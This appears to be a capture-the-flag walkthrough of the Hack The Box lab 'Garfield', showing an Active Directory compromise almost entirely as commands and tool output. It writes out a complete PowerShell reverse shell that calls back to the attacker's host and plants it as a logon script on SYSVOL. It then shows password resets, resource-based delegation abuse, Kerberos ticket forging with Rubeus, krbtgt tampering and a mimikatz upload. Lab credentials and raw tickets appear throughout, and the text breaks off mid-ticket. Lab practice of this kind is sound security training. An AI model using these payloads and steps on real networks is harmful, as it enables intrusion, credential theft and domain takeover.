# Garfield


Phase 1: Initial Access & Enumeration
You start with valid credentials for the user Jon Arbuckle:

User: j.arbuckle

Password: Th1sD4mnC4t!@1978

Using a tool like bloodyAD or BloodHound, the players discovered that j.arbuckle has WRITE permissions over several objects, most notably Liz Wilson.


sudo nano /etc/hosts
# Add: <TARGET_IP> garfield.htb

sudo ntpdate 10.129.139.64

crackmapexec smb garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --users

bloodhound-python -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' -ns 10.129.139.64 -d garfield.htb -c All


bloodyAD --host garfield.htb -d garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' get writable

MATCH p=(u:User)-[r:GenericWrite|WriteDacl|WriteOwner|Owns|AddKeyCredentialLink|ForceChangePassword|AddMember]->(t:User) RETURN p


Phase 2: ACL Abuse via scriptPath
Because you have write access to Liz's AD object, you can modify her user attributes. The chat leverages the scriptPath attribute. In AD environments, this attribute defines a script that runs automatically when a user logs in.

Craft the Payload: You need a PowerShell reverse shell encoded in base64.

echo '$client = New-Object System.Net.Sockets.TCPClient("<YOUR_TUN0_IP>",9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv -t UTF-16LE | base64 -w0


Host the Script: Create a batch file (they named it printerDetect.bat) that calls your encoded PowerShell payload and host it on an accessible SMB share (like SYSVOL).




cat > printerDetect.bat << EOF
@echo off
powershell -NoP -NonI -W Hidden -Exec Bypass -Enc <PASTE_YOUR_BASE64_STRING_HERE>
EOF



smbclient //10.129.139.64/SYSVOL -U 'j.arbuckle%Th1sD4mnC4t!@1978'

smb: \> cd garfield.htb\scripts\
smb: \garfield.htb\scripts\> put printerDetect.bat
smb: \garfield.htb\scripts\> exit
nc -lvnp 9001

bloodyAD --host 10.129.139.64 -d garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' set object "CN=Liz Wilson,CN=Users,DC=garfield,DC=htb" scriptPath -v printerDetect.bat

Phase 3: Privilege Escalation (l.wilson_adm)
Once you catch the reverse shell as l.wilson, you are inside the network. Liz has the authority to reset the password for her administrative account (l.wilson_adm).

Execute the password reset directly from your reverse shell:

whoami
net user l.wilson_adm z0n123!! /domain
exit



PS C:\Windows\system32> $user = [ADSI]"LDAP://CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb"
PS C:\Windows\system32> $user.SetPassword("Garfield_HTB_Admin_2026!@#")
PS C:\Windows\system32> $user.CommitChanges()
PS C:\Windows\system32> 

┌──(z0n㉿0x0z0n)-[~/z0n/z0n/posts/Garfield]
└─$ crackmapexec smb 10.129.139.64 -u 'l.wilson_adm' -p 'Garfield_HTB_Admin_2026!@#'
SMB         10.129.139.64  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:garfield.htb) (signing:True) (SMBv1:False)
SMB         10.129.139.64  445    DC01             [+] garfield.htb\l.wilson_adm:Garfield_HTB_Admin_2026!@# 




Phase 4: use Flag

evil-winrm -i 10.129.139.64 -u 'l.wilson_adm' -p 'Garfield_HTB_Admin_2026!@#'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> ls
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\l.wilson_adm\Desktop> ls


    Directory: C:\Users\l.wilson_adm\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         4/5/2026   5:59 AM             34 user.txt


*Evil-WinRM* PS C:\Users\l.wilson_adm\Desktop> cat user.txt
7836c4XXXXXXXXXXXXXXXXXXXXXXX
*Evil-WinRM* PS C:\Users\l.wilson_adm\Desktop> cd C:\Windows\Temp
*Evil-WinRM* PS C:\Windows\Temp> upload agent.exe




Phase 5: The Road to Root (Pivoting)
Once you successfully authenticate as l.wilson_adm, the chat indicates that you are not done. There is an internal, isolated network containing a Read-Only Domain Controller (RODC01) at 192.168.100.2.

You will need to set up a pivot (they mention using ligolo-ng) to route your attacker machine's traffic through your compromised host into that 192.168.100.x subnet to continue enumerating for the root flag.


sudo ip tuntap add user 0x0z0n mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert



upload /path/to/your/kali/agent.exe C:\Windows\Temp\agent.exe
C:\Windows\Temp\agent.exe -connect <YOUR_TUN0_IP>:11601 -ignore-cert


    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!
  Version: 0.8.3

ligolo-ng » INFO[0016] Agent joined.                                 id=00155d0bdd00 name="GARFIELD\\l.wilson_adm@DC01" remote="10.129.139.64:53657"
ligolo-ng » 
ligolo-ng » session
? Specify a session : 1 - GARFIELD\l.wilson_adm@DC01 - 10.129.139.64:53657 - 00155d0bdd00
[Agent : GARFIELD\l.wilson_adm@DC01] » start
INFO[0030] Starting tunnel to GARFIELD\l.wilson_adm@DC01 (00155d0bdd00) 
[Agent : GARFIELD\l.wilson_adm@DC01] »  



┌──(z0n㉿0x0z0n)-[~/z0n/z0n/posts/Garfield]
└─$ sudo ip tuntap add user z0n mode tun ligolo

┌──(z0n㉿0x0z0n)-[~/z0n/z0n/posts/Garfield]
└─$ sudo ip link set ligolo up

┌──(z0n㉿0x0z0n)-[~/z0n/z0n/posts/Garfield]
└─$ sudo ip route add 192.168.100.0/24 dev ligolo


evil-winrm -i 192.168.100.2 -u 'l.wilson_adm' -p 'Garfield_HTB_Admin_2026!@#'

*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> 


evil-winrm -i 10.129.139.64 -u 'l.wilson_adm' -p 'Garfield_HTB_Admin_2026!@#'




└─$ bloodyAD --host 10.129.139.64 -d garfield.htb -u 'l.wilson_adm' -p 'Garfield_HTB_Admin_2026!@#' set password 'RODC01$' 'PwnedRODC_2026!@#'
[+] Password changed successfully!



┌──(myenv)(z0n㉿0x0z0n)-[~/z0n/z0n/posts/Garfield]
└─$ bloodyAD --host 10.129.139.64 -d garfield.htb -u 'RODC01$' -p 'PwnedRODC_2026!@#' set password 'krbtgt_8245' 'GoldenTicketKey2026!@#'
[+] Password changed successfully!




*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> Get-ADOptionalFeature -Filter 'Name -like "Recycle Bin Feature"'


DistinguishedName  : CN=Recycle Bin Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=garfield,DC=htb
EnabledScopes      : {CN=NTDS Settings,CN=RODC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=garfield,DC=htb, CN=Partitions,CN=Configuration,DC=garfield,DC=htb, CN=NTDS
                     Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=garfield,DC=htb}
FeatureGUID        : 766ddcd8-acd0-445e-f3b9-a7f9b6744f2a
FeatureScope       : {ForestOrConfigurationSet}
IsDisableable      : False
Name               : Recycle Bin Feature
ObjectClass        : msDS-OptionalFeature
ObjectGUID         : b09343fa-492d-45f8-9c9a-c4ac0e02a4af
RequiredDomainMode :
RequiredForestMode : Windows2008R2Forest



┌──(z0n㉿0x0z0n)-[~/z0n/z0n/posts/Garfield]                                                                                                                                                                                                                 
└─$ bloodyAD --host dc01.garfield.htb -d garfield.htb -u l.wilson_adm -p 'Garfield_HTB_Admin_2026!@#' add groupMember 'RODC Administrators' 'l.wilson_adm'                                                                                                  
[+] l.wilson_adm added to RODC Administrators 


┌──(z0n㉿0x0z0n)-[~/z0n/z0n/posts/Garfield]
└─$ impacket-addcomputer garfield.htb/l.wilson_adm:'Garfield_HTB_Admin_2026!@#' -computer-name FAKES -computer-pass 'FakePassword123!' -dc-host dc01.garfield.htb
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account FAKES$ with password FakePassword123!.


┌──(z0n㉿0x0z0n)-[~/z0n/z0n/posts/Garfield]
└─$ impacket-rbcd -delegate-from 'FAKES$' -delegate-to 'RODC01$' -action write 'garfield.htb/l.wilson_adm:Garfield_HTB_Admin_2026!@#' -dc-host dc01.garfield.htb
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] FAKES$ can now impersonate users on RODC01$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     FAKES$       (S-1-5-21-2502726253-3859040611-225969357-10601)






echo -n 'FakePassword123!' | iconv -t utf16le | openssl dgst -md4

MD4(stdin)= 3c16f6dc56f01f00503331567c4cc5b7

└─$ echo -n 'GoldenTicketKey2026!@#' | iconv -t utf16le | openssl dgst -md4
MD4(stdin)= 6d0850da20ee4a11b06bfd7a31cdcf11


┌──(myenv)(z0n㉿0x0z0n)-[~/z0n/z0n/posts/Garfield]
└─$ impacket-lookupsid garfield.htb/l.wilson_adm:'Garfield_HTB_Admin_2026!@#'@10.129.139.64
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at 10.129.139.64
[*] StringBinding ncacn_np:10.129.139.64[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2502726253-3859040611-225969357
498: GARFIELD\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: GARFIELD\Administrator (SidTypeUser)
501: GARFIELD\Guest (SidTypeUser)
502: GARFIELD\krbtgt (SidTypeUser)
512: GARFIELD\Domain Admins (SidTypeGroup)
513: GARFIELD\Domain Users (SidTypeGroup)
514: GARFIELD\Domain Guests (SidTypeGroup)
515: GARFIELD\Domain Computers (SidTypeGroup)
516: GARFIELD\Domain Controllers (SidTypeGroup)
517: GARFIELD\Cert Publishers (SidTypeAlias)
518: GARFIELD\Schema Admins (SidTypeGroup)
519: GARFIELD\Enterprise Admins (SidTypeGroup)
520: GARFIELD\Group Policy Creator Owners (SidTypeGroup)
521: GARFIELD\Read-only Domain Controllers (SidTypeGroup)
522: GARFIELD\Cloneable Domain Controllers (SidTypeGroup)
525: GARFIELD\Protected Users (SidTypeGroup)
526: GARFIELD\Key Admins (SidTypeGroup)
527: GARFIELD\Enterprise Key Admins (SidTypeGroup)
553: GARFIELD\RAS and IAS Servers (SidTypeAlias)
571: GARFIELD\Allowed RODC Password Replication Group (SidTypeAlias)
572: GARFIELD\Denied RODC Password Replication Group (SidTypeAlias)
1000: GARFIELD\DC01$ (SidTypeUser)
1101: GARFIELD\DnsAdmins (SidTypeAlias)
1102: GARFIELD\DnsUpdateProxy (SidTypeGroup)
1602: GARFIELD\RODC01$ (SidTypeUser)
1603: GARFIELD\krbtgt_8245 (SidTypeUser)
2101: GARFIELD\RODC Administrators (SidTypeGroup)
3101: GARFIELD\j.arbuckle (SidTypeUser)
3105: GARFIELD\l.wilson (SidTypeUser)
3106: GARFIELD\IT Support (SidTypeGroup)
3107: GARFIELD\l.wilson_adm (SidTypeUser)
3108: GARFIELD\Tier 1 (SidTypeGroup)



┌──(myenv)(z0n㉿0x0z0n)-[~/z0n/z0n/posts/Garfield]                                                                                                                                                                                                          
└─$ bloodyAD --host 10.129.139.64 -d garfield.htb -u l.wilson_adm -p 'Garfield_HTB_Admin_2026!@#' add groupMember 'RODC Administrators' 'l.wilson_adm'                                                                                                       
[+] l.wilson_adm added to RODC Administrators                                                                                                                                                                                                               
                                                                                                                                                                                                                                                            
┌──(myenv)(z0n㉿0x0z0n)-[~/z0n/z0n/posts/Garfield]                                                                                                                                                                                                          
└─$ impacket-addcomputer garfield.htb/l.wilson_adm:'Garfield_HTB_Admin_2026!@#' -computer-name z0n -computer-pass 'FakePassword123!' -dc-ip 10.129.139.64                                                                                                    
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies                                                                                                                                                                                       
                                                                                                                                                                                                                                                            
[*] Successfully added machine account z0n$ with password FakePassword123!.                                                                                                                                                                                 
                                                                                                                                                                                                                                                            
┌──(myenv)(z0n㉿0x0z0n)-[~/z0n/z0n/posts/Garfield]                                                                                                                                                                                                          
└─$ impacket-rbcd -delegate-from 'z0n$' -delegate-to 'RODC01$' -action write 'garfield.htb/l.wilson_adm:Garfield_HTB_Admin_2026!@#' -dc-ip 10.129.139.64                                                                                                     
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies                                                                                                                                                                                       
                                                                                                                                                                                                                                                            
[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty                                                                                                                                                                                             
[*] Delegation rights modified successfully! 
[*] z0n$ can now impersonate users on RODC01$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     z0n$         (S-1-5-21-2502726253-3859040611-225969357-10601)

┌──(myenv)(z0n㉿0x0z0n)-[~/z0n/z0n/posts/Garfield]
└─$ impacket-getST -spn cifs/rodc01.garfield.htb -impersonate Administrator -altservice host 'garfield.htb/z0n$:FakePassword123!' -dc-ip 10.129.139.64
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Changing service from cifs/rodc01.garfield.htb@GARFIELD.HTB to host/rodc01.garfield.htb@GARFIELD.HTB
[*] Saving ticket in Administrator@host_rodc01.garfield.htb@GARFIELD.HTB.ccache


┌──(myenv)(z0n㉿0x0z0n)-[~/z0n/z0n/posts/Garfield]
└─$ export KRB5CCNAME=Administrator@host_rodc01.garfield.htb@GARFIELD.HTB.ccache

┌──(myenv)(z0n㉿0x0z0n)-[~/z0n/z0n/posts/Garfield]
└─$ 

┌──(myenv)(z0n㉿0x0z0n)-[~/z0n/z0n/posts/Garfield]
└─$ evil-winrm -i 10.129.139.64 -u 'l.wilson_adm' -p 'Garfield_HTB_Admin_2026!@#'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                           Attributes
=========================================== ================ ============================================= ==================================================
Everyone                                    Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users                Alias            S-1-5-32-555                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
GARFIELD\Tier 1                             Group            S-1-5-21-2502726253-3859040611-225969357-3108 Mandatory group, Enabled by default, Enabled group
GARFIELD\RODC Administrators                Group            S-1-5-21-2502726253-3859040611-225969357-2101 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> 
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> Import-Module ActiveDirectory
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> Set-ADObject -Identity "CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb" -Clear msDS-NeverRevealGroup
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> Set-ADObject -Identity "CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb" -Add @{"msDS-RevealOnDemandGroup"="CN=Administrator,CN=Users,DC=garfield,DC=htb"}





┌──(myenv)(z0n㉿0x0z0n)-[~/z0n/z0n/posts/Garfield]                                                                                                                                                                                                          
└─$ evil-winrm -i 192.168.100.2 -u 'l.wilson_adm' -p 'Garfield_HTB_Admin_2026!@#'                                                                                                                                                                           
                                                                                                                                                                                                                                                            
Evil-WinRM shell v3.9                                                                                                                                                                                                                                       
                                                                                                                                                                                                                                                            
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                                            
                                                                                                                                                                                                                                                            
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                                       
                                                                                                                                                                                                                                                            
Info: Establishing connection to remote endpoint                                                                                                                                                                                                            
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> upload mimikatz.exe                                                                                                                                                                                        
                                                                                                                                                                                                                                                            
Info: Uploading /home/z0n/z0n/z0n/posts/Garfield/mimikatz.exe to C:\Users\l.wilson_adm\Documents\mimikatz.exe                                                                                                                                               
                                                                                                                                                                                                                                                            
Data: 1985192 bytes of 1985192 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
GARFIELD\Tier 1                            Group            S-1-5-21-2502726253-3859040611-225969357-3108 Mandatory group, Enabled by default, Enabled group
GARFIELD\RODC Administrators               Group            S-1-5-21-2502726253-3859040611-225969357-2101 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> 




*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> upload Rubeus.exe                                                                                                                                                                                          
                                                                                                                                                                                                                                                            
Info: Uploading /home/z0n/z0n/z0n/posts/Garfield/Rubeus.exe to C:\Users\l.wilson_adm\Documents\Rubeus.exe                                                                                                                                                   
                                                                                                                                                                                                                                                            
Data: 1008980 bytes of 1008980 bytes copied                                                                                                                                                                                                                 
                                                                                                                                                                                                                                                            
Info: Upload successful!                                                                                                                                                                                                                                    
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> .\Rubeus.exe s4u /user:z0n$ /rc4:3c16f6dc56f01f00503331567c4cc5b7 /impersonateuser:Administrator /msdsspn:cifs/rodc01.garfield.htb /ptt                                                                    
                                                                                                                                                                                                                                                            
   ______        _                                                                                                                                                                                                                                          
  (_____ \      | |                                                                                                                                                                                                                                         
   _____) )_   _| |__  _____ _   _  ___                                                                                                                                                                                                                     
  |  __  /| | | |  _ \| ___ | | | |/___)                                                                                                                                                                                                                    
  | |  \ \| |_| | |_) ) ____| |_| |___ |                                                                                                                                                                                                                    
  |_|   |_|____/|____/|_____)____/(___/                                                                                                                                                                                                                     
                                                                                                                                                                                                                                                            
  v2.0.0                                                                                                                                                                                                                                                    
                                                                                                                                                                                                                                                            
[*] Action: S4U                                                                                                                                                                                                                                             
                                                                                                                                                                                                                                                            
[*] Using rc4_hmac hash: 3c16f6dc56f01f00503331567c4cc5b7                                                                                                                                                                                                   
[*] Building AS-REQ (w/ preauth) for: 'garfield.htb\z0n$'                                                                                                                                                                                                   
[+] TGT request successful!                                                                                                                                                                                                                                 
[*] base64(ticket.kirbi):                                                                                                                                                                                                                                   
                                                                                                                                                                                                                                                            
      doIFQjCCBT6gAwIBBaEDAgEWooIEWzCCBFdhggRTMIIET6ADAgEFoQ4bDEdBUkZJRUxELkhUQqIhMB+g                                                                                                                                                                      
      AwIBAqEYMBYbBmtyYnRndBsMZ2FyZmllbGQuaHRio4IEEzCCBA+gAwIBEqEDAgECooIEAQSCA/1Y4JrE                                                                                                                                                                      
      lKktaOG4VS/Fb8/a4fdkXlP2/9NsUDXdxoX4ms5B+VJu3p326fIhVa3tOXOXO7rKJKo2y8w1NC/LMv18                                                                                                                                                                      
      e+/QDanjt76YXaT2Wj6vd0emklWdkFemkP7hwUIVXb7spYgVBjSdjpvqgKCWT8HXFCw8L9enqdW3TF1j                                                                                                                                                                      
      /e8lxa7S8izV8hr4rD4Fk1LSIk2KWH3IQPmURuzIpV77esyMOD3/YOBAXjWSULoKtqqnWnyVSsKCoVBg                                                                                                                                                                      
      FguVzukB+P8gFlT6gvse3FPeM0ssnfCDwF1A5LZX6onOR2qsCsLDB0WXaoYDZRZrKHFHUs6VkuDzuHPq                                                                                                                                                                      
      XLm2Y8MVcdZod8Obs45XjjbQxUte9wGbWLVYD9ijHu5aJsV1agBdjl8HeLQ2mtcAfLLQXhrHLdtphIwE                                                                                                                                                                      
      1bb0n4zlVM6GT7bZiSGEBZLVTusV9zspathYWfb84i5zd00pjZuhAVoFbQ0VWVU2UVMOIXADRwO14Nv0                                                                                                                                                                      
      ppzcHcfbgytw0fi3p6uv0MxcEvQ5/zxrLeD6QHXhMERMuJfRbkbVRI/zBZt/femANLq/dxvoFVdv2my1                                                                                                                                                                      
      FVFcVivU/QtoI9ik+Qn7K1x0eHlRHhbZquqwJFwq0B+rvg7PtyDEr2CMxDRwH0PTVY5s1BOQSjYny3IS                                                                                                                                                                      
      481a8dKJlhDINZpMTqO7TR9iG8s9XAcoTKpISvNty1vvvU0Uv/+cBHDRaNpYuuuxEgHHvwylggVZDSdQ                                                                                                                                                                      
      lkTJjTpFyS1H1WyR8aTguRP3h688j2RoPqPWyBW6nSqvCVaZWCy+XmJsUtzUGZFjKDaD1yFGhiG9GJbV                                                                                                                                                                      
      oUqzRW6neiH6pjv6BDpFgDlgxBb+DpeJwtfD/qLj+V+Tqo9fVKGAHQvES8UlA25auhAHX15kdVknwL76                                                                                                                                                                      
      vyXZWKhWaD30iRkSq2oosrujw9Aieg/NPbh1dl0aMiFdzgf63RHhQjt0UEMaWPmj8kOBO1DsomDghIxk                                                                                                                                                                      
      N/SYeFWrJ6WjQvF4T8NoMU4kzNqVwRhq/EEhXn5fvIrIkH5vYlwkHkBqUMY0o08etWHcf8fcVIOrI4ZW                                                                                                                                                                      
      NKJP2WgYXCKx0gheJDsfK2/d2D2504w+DlqWDetSEAZYILQMZCfPEjRrd3ktrBuNLGlzc4wdE2xs9xY4                                                                                                                                                                      
      FujBSpP1fDtLR060Svh1biqkFzKXJ1d4gOichSPtDxfGKX8Q4RyEOjgwe+MlfHBgEUkVZue2bQm21/wv                                                                                                                                                                      
      ij5UI0huwbIhhoav1jwDZ+j0UgdTFSlwZWUrdZ+82cda57SXctT2UuYZEwguQoGYA9skIs7WOZsNWmOp                                                                                                                                                                      
      Y2HFO48+IpQzma8lyPM31xdN6B9WQnrdYpgkK9l968J8UJiCqLz56BrkrDGeKhYe8pQhOkFgvOWCo4HS                                                                                                                                                                      
      MIHPoAMCAQCigccEgcR9gcEwgb6ggbswgbgwgbWgGzAZoAMCARehEgQQCCDVgGVEitFyXlXU146pEaEO                                                                                                                                                                      
      GwxHQVJGSUVMRC5IVEKiETAPoAMCAQGhCDAGGwR6MG4kowcDBQBA4QAApREYDzIwMjYwNDA2MTgzMDMw                                                                                                                                                                      
      WqYRGA8yMDI2MDQwNzA0MzAzMFqnERgPMjAyNjA0MTMxODMwMzBaqA4bDEdBUkZJRUxELkhUQqkhMB+g                                                                                                                                                                      
      AwIBAqEYMBYbBmtyYnRndBsMZ2FyZmllbGQuaHRi                                                                                                                                                                                                              
      [*] Action: S4U

[*] Using domain controller: RODC01.garfield.htb (fe80::7a33:8251:f697:4c2d%5)
[*] Building S4U2self request for: 'z0n$@GARFIELD.HTB'
[*] Sending S4U2self request
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'z0n$@GARFIELD.HTB'
[*] base64(ticket.kirbi):

      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
